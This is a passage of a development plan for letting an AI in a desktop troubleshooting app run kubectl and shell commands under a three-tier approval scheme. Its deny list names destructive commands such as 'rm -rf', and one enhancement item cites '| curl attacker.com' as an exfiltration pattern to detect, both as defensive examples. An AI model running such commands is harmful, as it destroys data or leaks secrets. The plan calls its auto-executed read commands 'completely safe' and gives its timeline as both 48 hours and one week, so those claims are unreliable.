  "https://dl.k8s.io/release/$KUBECTL_VERSION/bin/darwin/amd64/kubectl"

# macOS ARM64
curl -L -o "$EXTERNAL_BIN_DIR/kubectl-aarch64-apple-darwin" \
  "https://dl.k8s.io/release/$KUBECTL_VERSION/bin/darwin/arm64/kubectl"

# Windows
curl -L -o "$EXTERNAL_BIN_DIR/kubectl-x86_64-pc-windows-msvc.exe" \
  "https://dl.k8s.io/release/$KUBECTL_VERSION/bin/windows/amd64/kubectl.exe"

# Make executable (except Windows)
chmod +x "$EXTERNAL_BIN_DIR"/kubectl-*-linux-* "$EXTERNAL_BIN_DIR"/kubectl-*-darwin

echo "kubectl binaries downloaded successfully"
```

Run during build:
```bash
chmod +x scripts/download-kubectl.sh
./scripts/download-kubectl.sh
```

#### 5.2 Update Tauri Configuration

**File: `src-tauri/tauri.conf.json`**

Update the `bundle.externalBin` array (currently empty at line 42):

```json
{
  "bundle": {
    "externalBin": [
      "externalBin/kubectl-x86_64-unknown-linux-gnu",
      "externalBin/kubectl-aarch64-unknown-linux-gnu",
      "externalBin/kubectl-x86_64-apple-darwin",
      "externalBin/kubectl-aarch64-apple-darwin",
      "externalBin/kubectl-x86_64-pc-windows-msvc"
    ]
  }
}
```

#### 5.3 Add to CI/CD Pipeline

**File: `.gitea/workflows/auto-tag.yml`**

Add kubectl download step before build:

```yaml
- name: Download kubectl binaries
  run: |
    chmod +x scripts/download-kubectl.sh
    ./scripts/download-kubectl.sh
```

**Important**: Add `src-tauri/externalBin/` to `.gitignore` (binaries should not be committed):

```
# kubectl binaries (downloaded during build)
src-tauri/externalBin/
```

---

### Phase 6: End-to-End Testing & Polish (Hours 42-48)

**E2E Test Suite**: Test the complete flow in running application

#### 6.1 Continuous Testing Throughout Development

**TDD Workflow** (Repeat for every feature):

1. **Write failing test** (Red)
2. **Implement minimum code** to pass (Green)
3. **Refactor** while keeping tests green
4. **Commit** with test + implementation together

**Test Commands to Run Frequently**:
```bash
# Backend tests (run after every Rust change)
cargo test --manifest-path src-tauri/Cargo.toml

# Frontend tests (run after every TypeScript change)
npm run test:run

# Linting (run before commits)
cargo clippy --manifest-path src-tauri/Cargo.toml -- -D warnings
npx eslint . --max-warnings 0

# Type checking (run before commits)
npx tsc --noEmit
```

**Test Coverage Goals**:
- Command classifier: 100% (critical safety component)
- kubectl locator: 90%
- Executor: 85%
- Frontend components: 80%

**Tests Already Written Above** (in TDD sections):
- ✅ Classifier: 10 unit tests
- ✅ kubectl: 4 unit tests
- ✅ Integration: 2 tests
- ✅ Frontend: 3 component tests

#### 6.2 Integration Testing (Manual)

**Test Plan**:

1. **Tier 1 Auto-Execution**
   - Start app, create new issue
   - Ask AI: "Show me all pods in the default namespace"
   - Verify: Command executes immediately without approval modal
   - Check: `command_executions` table has entry with `approval_status='auto'`

2. **Tier 2 Approval Flow**
   - Ask AI: "Scale the nginx deployment to 5 replicas"
   - Verify: Approval modal appears with command details
   - Test "Deny" button: Command not executed, AI receives error
   - Test "Allow Once" button: Command executes, next similar command requires approval again
   - Test "Allow for Session" button: Command executes, next similar command auto-approved

3. **Tier 3 Denial**
   - Ask AI: "Delete all files in /tmp"
   - Verify: No modal, AI receives immediate error with classification reasoning
   - Check: `command_executions` table has entry with `approval_status='denied'`

4. **Kubeconfig Management**
   - Go to Settings → Shell Execution → Manage Kubeconfigs
   - Upload custom kubeconfig file
   - Verify: Appears in list with contexts
   - Activate different config
   - Execute kubectl command
   - Verify: Uses correct cluster

5. **Piped Command Analysis**
   - Ask AI: "Show me pods and filter for 'nginx'"
   - Expected command: `kubectl get pods | grep nginx`
   - Verify: Classified as Tier 1 (both components are safe)
   - Ask AI: "Get pods and delete them"
   - Expected command: `kubectl get pods | kubectl delete -f -`
   - Verify: Classified as Tier 2 (contains delete)

6. **Timeout Protection**
   - Manually trigger long-running command (e.g., `sleep 60`)
   - Verify: Times out after 30 seconds with error message

7. **PII Detection**
   - Trigger command with API key in arguments
   - Verify: Warning logged in audit log
   - Command still executes (non-blocking warning)

8. **Audit Trail**
   - Execute various commands
   - Check database: `SELECT * FROM command_executions ORDER BY executed_at DESC LIMIT 10`
   - Check audit log: `SELECT * FROM audit_log WHERE event_type='shell_tool_call'`
   - Verify: All commands logged with correct details

#### 6.3 Documentation

**File: `docs/shell-execution.md`**

Create comprehensive documentation:

```markdown
# Shell Command Execution

## Overview

TFTSR's agentic shell execution allows the AI to autonomously run diagnostic commands with intelligent safety controls.

## Supported Command Types

### Kubernetes (kubectl)
- Auto-execute: get, describe, logs, explain, api-resources, version
- Require approval: apply, delete, edit, scale, rollout, exec

### Proxmox
- Auto-execute: pvecm status, pvesh get, qm status
- Require approval: qm migrate, pvesh create/delete

### General Shell
- Auto-execute: cat, grep, ls, find, df, free
- Require approval: awk, sed, systemctl restart, ssh
- Always deny: rm -rf, shutdown, reboot

## Safety Architecture

### Three-Tier Classification

**Tier 1**: Read-only, no side effects → Auto-execute
**Tier 2**: Potentially mutating → User approval required
**Tier 3**: Destructive → Always denied with explanation

### Pipe/Chain Analysis

Commands are parsed for pipes (`|`), logical operators (`&&`, `||`), and semicolons (`;`). The highest tier among all components determines the overall classification.

Example:
- `kubectl get pods | grep nginx` → Tier 1 (both safe)
- `kubectl get pods | kubectl delete -f -` → Tier 2 (contains delete)

### Command Substitution Detection

Commands containing `$()` or backticks are automatically escalated to Tier 2 for approval.

## Kubeconfig Management

### Auto-Detection

On startup, TFTSR checks for `~/.kube/config` and imports all contexts automatically.

### Multiple Clusters

Upload additional kubeconfig files via Settings → Shell Execution → Manage Kubeconfigs. Switch between clusters by activating different configs.

### Security

Kubeconfig files are encrypted using AES-256-GCM and stored in the SQLCipher database. Decryption only occurs during command execution.

## kubectl Binary Management

kubectl is bundled with the application for all platforms (Linux amd64/arm64, macOS, Windows). If a system kubectl exists in PATH, the bundled version is preferred to ensure version consistency.

## Approval Workflow

When a Tier 2 command is detected:

1. Agentic loop pauses
2. Modal appears showing command, classification reasoning, and risk factors
3. User chooses:
   - **Deny**: Command not executed, AI receives error
   - **Allow Once**: Command executes, approval required next time
   - **Allow for Session**: Command and similar commands auto-approved for session

## Audit Trail

All command executions are logged in:
- `command_executions` table: Full command, exit code, stdout, stderr, timing
- `audit_log` table: Hash-chained audit entries for tamper evidence

## API Reference

See `src/lib/tauriCommands.ts` for TypeScript API documentation.
```

**Update main `CLAUDE.md`**:

Add new section after "Woodpecker CI + Gogs Compatibility":

```markdown
### Shell Command Execution (v0.3)

**Status**: Agentic shell command execution with three-tier safety classification.

**Features**:
- kubectl commands with bundled binary (auto-detected fallback to system PATH)
- Proxmox tools (pvecm, pvesh, qm)
- General shell diagnostics
- Real-time approval modal for Tier 2 (mutating) commands
- Multiple kubeconfig support with encrypted storage
- Pipe/chain command analysis
- Command execution history and audit logging

**Key Files**:
- `src-tauri/src/shell/classifier.rs`: Command safety classification engine
- `src-tauri/src/shell/executor.rs`: Execution flow with approval gates
- `src-tauri/src/shell/kubectl.rs`: kubectl binary locator
- `src-tauri/src/commands/shell.rs`: Tauri commands for frontend
- `src/components/ShellApprovalModal.tsx`: Real-time approval UI

**How It Works**:
1. AI receives `execute_shell_command` tool in available tools list
2. AI decides to call tool based on conversation context
3. Backend classifies command (Tier 1/2/3)
4. Tier 1: Auto-execute, Tier 2: Show approval modal, Tier 3: Deny
5. PII detection + audit logging before execution
6. Result returned to AI for continued reasoning

See `docs/shell-execution.md` for full documentation.
```

---

## Critical Integration Points

### 1. Agentic Loop (NO CHANGES NEEDED)

The existing agentic loop at `src-tauri/src/commands/ai.rs:304-356` already handles tool calling:

```rust
// Existing code (lines 304-356)
for _ in 0..max_iterations {
    let response = provider.chat(messages.clone(), config, Some(&all_tools)).await?;
    
    if let Some(tool_calls) = response.tool_calls {
        for tool_call in tool_calls {
            let result = execute_tool_call(&tool_call, &app_handle, &state).await?;
            messages.push(Message { role: "tool", content: result, ... });
        }
    } else {
        return Ok(response.content);  // Done
    }
}
```

**What we add**: Just register the new tool and route its execution. The loop handles everything else automatically.

### 2. PII Detection Pattern

**Source**: `commands/ai.rs:897-908`

```rust
let detector = crate::pii::detector::PiiDetector::new();
let spans = detector.detect(&tool_call.arguments);
if !spans.is_empty() {
    tracing::warn!(
        tool = %tool_call.name,
        pii_spans = spans.len(),
        "PII detected in tool call arguments"
    );
}
```

Reuse this exact pattern in `execute_shell_tool_call()`.

### 3. Audit Logging Pattern

**Source**: `commands/ai.rs:910-928`

```rust
let db = app_state.db.lock().map_err(|e| e.to_string())?;
let details = serde_json::json!({ "tool": tool_call.name, ... });
crate::audit::log::write_audit_event(
    &db,
    "mcp_tool_call",
    "mcp_tool",
    &tool_call.name,
    &details.to_string(),
).map_err(|e| format!("Audit log failed: {e}"))?;
```

Reuse this pattern, change event type to `"shell_tool_call"`.

### 4. Tauri Event Emission Pattern

**Source**: `ollama/manager.rs:53-62`

```rust
let _ = app_handle.emit(
    "model://progress",
    serde_json::json!({ "name": model_name, "status": status }),
);
```

Reuse for emitting `shell:approval-needed` events.

### 5. Modal UI Pattern

**Source**: `components/ImageGallery.tsx:12-25`

```tsx
const [isModalOpen, setIsModalOpen] = useState(false);

useEffect(() => {
  const handleKeyDown = (e: KeyboardEvent) => {
    if (e.key === "Escape" && isModalOpen) {
      setIsModalOpen(false);
    }
  };
  window.addEventListener("keydown", handleKeyDown);
  return () => window.removeEventListener("keydown", handleKeyDown);
}, [isModalOpen]);
```

Reuse this pattern for `ShellApprovalModal`.

---

## Dependencies (No New Crates Needed!)

All required crates already in `Cargo.toml`:
- ✅ `tauri-plugin-shell` (line 18)
- ✅ `regex` (line 25)
- ✅ `tokio` with full features (line 23)
- ✅ `serde_json` (line 22)
- ✅ `uuid` with v7 (line 27)
- ✅ `aes-gcm` for encryption (line 41)
- ✅ `sha2` for hashing (line 30)

**Optional**: Add `serde_yaml` for kubeconfig parsing:
```toml
serde_yaml = "0.9"
```

---

## Risk Mitigation for 48-Hour Timeline

### Pre-Built Infrastructure (90% Reuse)

| Component | Status | Source |
|-----------|--------|--------|
| Agentic loop | ✅ Complete | `commands/ai.rs:304-356` |
| Tool execution pipeline | ✅ Complete | `commands/ai.rs:847-952` |
| PII detection | ✅ Complete | `pii/detector.rs` |
| Audit logging | ✅ Complete | `audit/log.rs` |
| Database migrations | ✅ Complete | Pattern from `db/migrations.rs` |
| Tauri events | ✅ Complete | Example in `ollama/manager.rs` |
| Modal UI pattern | ✅ Complete | `components/ImageGallery.tsx` |
| Encrypted storage | ✅ Complete | `integrations/auth.rs` |

### Scope Flexibility (48-Hour Reality Check)

**Must Have (Priority 1)** - Required for demo:
- ✅ Command classifier (Tier 1/2/3) with tests
- ✅ Approval modal for Tier 2
- ✅ kubectl execution
- ✅ Single kubeconfig auto-detection
- ✅ Basic integration with existing agentic loop

**Nice to Have (Priority 2)** - Include if time permits:
- Multiple kubeconfig management (UI can be simple)
- Proxmox tools (just pvecm status, qm status)
- Command execution history (basic list view)

**Stretch Goals (Priority 3)** - Include in architecture, implement if time allows:
- Session-based approvals (store approval decisions in `approval_decisions` table)
- Advanced pipe/chain analysis (handle all edge cases: find -exec, xargs, etc.)
- Command templating (save frequently-used commands with parameters)
- Execution rollback capability (snapshot state before Tier 2 commands)
- Advanced tier overrides (per-user customization of command classifications)

**Implementation Strategy for P3**:
- Database schema includes these tables (migration 022)
- Code has hooks/placeholders for these features
- UI has disabled buttons with "Coming Soon" tooltips
- Can be activated post-hackathon with minimal refactoring

**TDD Time Management**:
- Tests = 30% of time
- Implementation = 50% of time
- Integration & debugging = 20% of time

Total: 48 hours with tests driving all development.

### 48-Hour Milestone Breakdown

**Hours 0-12** (Day 1 Morning → Evening):
- ✅ Test infrastructure setup
- ✅ Classifier tests + implementation (TDD)
- ✅ kubectl locator tests + implementation (TDD)
- ✅ Executor tests + implementation (TDD)
- ✅ All shell module unit tests passing

**Hours 12-24** (Day 1 Night → Day 2 Morning):
- ✅ Database migration tests + implementation
- ✅ Kubeconfig management tests + implementation
- ✅ Tauri command tests + implementation
- ✅ Tool registration with AI
- ✅ Backend integration tests passing

**Hours 24-36** (Day 2 Morning → Afternoon):
- ✅ Frontend component tests
- ✅ ShellApprovalModal implementation
- ✅ KubeconfigManager implementation
- ✅ Frontend tests passing
- ✅ kubectl binary bundling

**Hours 36-48** (Day 2 Afternoon → End):
- ✅ End-to-end testing with real kubectl
- ✅ Bug fixes driven by test failures
- ✅ Documentation
- ✅ Demo preparation
- ✅ Final polish

**Parallel Work Strategy** (Agentic Coding):
- Use multiple AI agents to implement different modules simultaneously
- Agent 1: Classifier + Tests
- Agent 2: kubectl + Executor + Tests
- Agent 3: Frontend Components + Tests
- Agent 4: Integration + Documentation

---

## Verification Strategy

### End-to-End Flow Test

1. **Start application**
   - Verify: kubeconfig auto-detected from ~/.kube/config
   - Verify: kubectl binary located (bundled or system)

2. **Create new issue for Kubernetes pod crash**
   - Domain: Kubernetes
   - Title: "Nginx pod CrashLoopBackOff"

3. **AI Autonomous Investigation**
   - User prompt: "Investigate why the nginx pod is crashing"
   - AI calls: `execute_shell_command({command: "kubectl get pods"})`
   - Verify: Executes immediately (Tier 1), no approval modal
   - AI receives: List of pods with nginx in CrashLoopBackOff state
   - AI calls: `execute_shell_command({command: "kubectl logs nginx-abc123"})`
   - Verify: Executes immediately (Tier 1)
   - AI receives: Pod logs showing error
   - AI identifies: Missing config file
   - AI calls: `execute_shell_command({command: "kubectl describe pod nginx-abc123"})`
   - Verify: Executes immediately (Tier 1)
   - AI receives: Pod events showing mount failure

4. **AI Suggests Fix with Approval**
   - AI suggests: "Scale the deployment to 0 to stop crash loop"
   - AI calls: `execute_shell_command({command: "kubectl scale deployment nginx --replicas=0"})`
   - Verify: Approval modal appears
   - User clicks: "Allow Once"
   - Verify: Command executes
   - AI confirms: "Deployment scaled to 0"

5. **Verify Audit Trail**
   - Query: `SELECT * FROM command_executions WHERE issue_id=... ORDER BY executed_at`
   - Verify: All 4 commands logged with correct tiers and approval statuses

6. **Generate RCA**
   - AI uses full command history as evidence
   - RCA includes: Exact commands run, outputs observed, actions taken
   - Export to Markdown/PDF

### Success Criteria

✅ AI can autonomously query Kubernetes without user intervention
✅ Tier 1 commands execute immediately (no friction)
✅ Tier 2 commands pause for approval (safety gate)
✅ Tier 3 commands are denied with clear reasoning
✅ Piped commands analyzed correctly
✅ Multiple kubeconfig files supported
✅ kubectl binary bundled and functional on all platforms
✅ All executions logged in audit trail
✅ RCA documents include command evidence

---

## Post-Hackathon Enhancements

### Advanced Features (Future)

1. **Command Templates**
   - User-defined templates with parameters
   - Example: "Check pod status: `kubectl get pod ${POD_NAME} -n ${NAMESPACE}`"
   - AI fills parameters based on context

2. **Multi-Cluster Orchestration**
   - Execute same command across multiple clusters in parallel
   - Aggregated results returned to AI

3. **Execution Rollback**
   - Record state before Tier 2 commands
   - Provide "undo" suggestions if command fails

4. **Advanced Pipe Analysis**
   - Detect data exfiltration patterns (e.g., `| curl attacker.com`)
   - Warning for pipe-to-network commands

5. **Proxmox API Integration**
   - Prefer REST API calls over shell commands when possible
   - Better structured output for AI parsing

6. **Custom Skill System**
   - User-defined skills with specific system prompts
   - Tie skills to specific tool sets
   - Example: "Redis Expert" skill enables Redis-specific commands

---

## Critical Files Reference

### Backend Core (Ordered by Dependencies)

1. **`src-tauri/src/shell/classifier.rs`** (~200 lines)
   - Command safety classification engine
   - No dependencies on other shell modules

2. **`src-tauri/src/shell/kubectl.rs`** (~150 lines)
   - kubectl binary locator and executor
   - No dependencies on other shell modules

3. **`src-tauri/src/shell/kubeconfig.rs`** (~200 lines)
   - Kubeconfig management and encryption
   - Depends on: `integrations/auth.rs` (encryption)

4. **`src-tauri/src/shell/executor.rs`** (~250 lines)
   - Command execution with approval flow
   - Depends on: `classifier.rs`, `kubectl.rs`

5. **`src-tauri/src/shell/mod.rs`** (~20 lines)
   - Module declarations

6. **`src-tauri/src/db/migrations.rs`**
   - Add 4 new migrations (019-022)

7. **`src-tauri/src/state.rs`**
   - Add `pending_approvals` field to `AppState`

8. **`src-tauri/src/commands/shell.rs`** (~300 lines)
   - Tauri commands for frontend

9. **`src-tauri/src/commands/mod.rs`**
   - Add `pub mod shell;`

10. **`src-tauri/src/ai/tools.rs`**
    - Add `get_execute_shell_command_tool()`

11. **`src-tauri/src/commands/ai.rs`**
    - Add `execute_shell_tool_call()`
    - Update `execute_tool_call()` match

12. **`src-tauri/src/lib.rs`**
    - Register shell commands in `invoke_handler!()`
    - Add kubeconfig auto-detection in `.setup()`

### Frontend Core

1. **`src/components/ShellApprovalModal.tsx`** (~250 lines)
   - Real-time approval modal UI

2. **`src/pages/Settings/KubeconfigManager.tsx`** (~300 lines)
   - Kubeconfig file management

3. **`src/pages/Settings/ShellExecution.tsx`** (~200 lines)
   - Shell execution settings panel

4. **`src/components/CommandHistory.tsx`** (~150 lines)
   - Execution history viewer

5. **`src/lib/tauriCommands.ts`**
   - Add type-safe command wrappers

6. **`src/App.tsx`**
   - Mount `ShellApprovalModal` at root

### Configuration & Build

1. **`src-tauri/tauri.conf.json`**
   - Update `bundle.externalBin` array

2. **`scripts/download-kubectl.sh`** (new file)
   - Download kubectl binaries for all platforms

3. **`.gitignore`**
   - Add `src-tauri/externalBin/`

4. **`.gitea/workflows/auto-tag.yml`**
   - Add kubectl download step

### Documentation

1. **`docs/shell-execution.md`** (new file)
   - Comprehensive feature documentation

2. **`CLAUDE.md`**
   - Add "Shell Command Execution" section

---

## Final Notes

This implementation reuses 90% of existing TFTSR infrastructure, making it low-risk for a one-week hackathon timeline. The agentic loop already exists; we're simply adding a new tool to its registry and implementing the safety controls around it.

The three-tier classification system provides clear safety boundaries:
- Tier 1 commands are completely safe → No user friction
- Tier 2 commands are potentially dangerous → User gate
- Tier 3 commands are always denied → Hard safety boundary

The kubectl binary bundling ensures out-of-box functionality without requiring users to pre-install tools, making it suitable for non-technical stakeholders who want to observe the AI troubleshooting autonomously.

All security controls (PII detection, audit logging, encrypted storage, command timeouts) are already battle-tested in production MCP tool execution, so we're extending proven patterns rather than inventing new ones.
